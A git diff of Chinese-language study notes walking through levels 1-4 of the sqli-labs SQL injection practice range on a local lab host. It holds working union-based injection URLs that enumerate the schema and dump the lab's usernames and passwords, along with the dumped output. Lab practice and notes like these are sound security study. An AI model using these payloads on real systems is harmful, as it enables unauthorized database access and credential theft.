@@ -407,46 +407,40 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
+#### sqli-labs靶场1-4关练习
 
-
-#### 练习:在靶场完成1-3关
-
-第一关:   要点:结束符 '并且要加--+注释limit
-
-```mysql
-user表
-Dumb=Dumb,Angelina=I-kill-you,Dummy=p@ssword,secure=crappy,stupid=stupidity,superman=genious,batman=mob!le,admin=admin,admin1=admin1,admin2=admin2,admin3=admin3,dhakkan=dumbo,admin4=admin4
+##### 第一关
 
 ```
+找注入点:http://192.168.96.135/sqli-labs/Less-1/index.php?id=1
+找闭合符:http://192.168.96.135/sqli-labs/Less-1/index.php?id=1'  
+找列数:http://192.168.96.135/sqli-labs/Less-1/index.php?id=1'order by 3 %23
+找字段显示位置:http://192.168.96.135/sqli-labs/Less-1/index.php?id=-1'union select 1,2,3 --+
+找库名:http://192.168.96.135/sqli-labs/Less-1/index.php?id=-1'union select 1,2,database() --+
+找表名:http://192.168.96.135/sqli-labs/Less-1/index.php?id=-1%27union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22%20--+    #emails,referers,uagents,users
+找列名:http://192.168.96.135/sqli-labs/Less-1/index.php?id=-1%27union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22--+
+找用户名密码:http://192.168.96.135/sqli-labs/Less-1/index.php?id=-1%27union%20select%201,2,group_concat(username,%22=%22,password)%20from%20users--+
 
-第二关:没有结束符
-
-```
-emails表
-1=Dumb@dhakkan.com,2=Angel@iloveu.com,3=Dummy@dhakkan.local,4=secure@dhakkan.local,5=stupid@dhakkan.local,6=superman@dhakkan.local,7=batman@dhakkan.local,8=admin@dhakkan.com
-```
-
-第三关:  结束符是')并且要加--+注释limit
-
-```
-referers表
-http://192.168.96.135/sqli-labs/Less-3/index.php?id=-2%27)%20union%20select%201,database(),group_concat(concat_ws(%27,%27,id,referer,ip_address))%20from%20referers%20--+
-
-1,2,3,2,w,as
-
+结果:Dumb=Dumb,Angelina=I-kill-you,Dummy=p@ssword,secure=crappy,stupid=stupidity,superman=genious,batman=mob!le,admin=admin,admin1=admin1,admin2=admin2,admin3=admin3,dhakkan=dumbo,admin4=admin4
 ```
 
-![image-20220906151130398](SQL注入.assets/image-20220906151130398.png)
+==闭合符为单引号==
 
-url编码:  #---->%23
+##### 第二关
 
-第四关:结束符是")  
+步骤与第一关一致,但没有闭合符
 
-````mysql
+##### 第三关
 
-````
+步骤与第一关一致,==闭合符为 ')==
 
-常用符号的url编码:
+##### 第四关
+
+步骤与第一关一致,==闭合符为")==
+
+
+
+#### 常用符号的url编码:
 
 | 符号    | url编码 |
 | ------- | ------- |
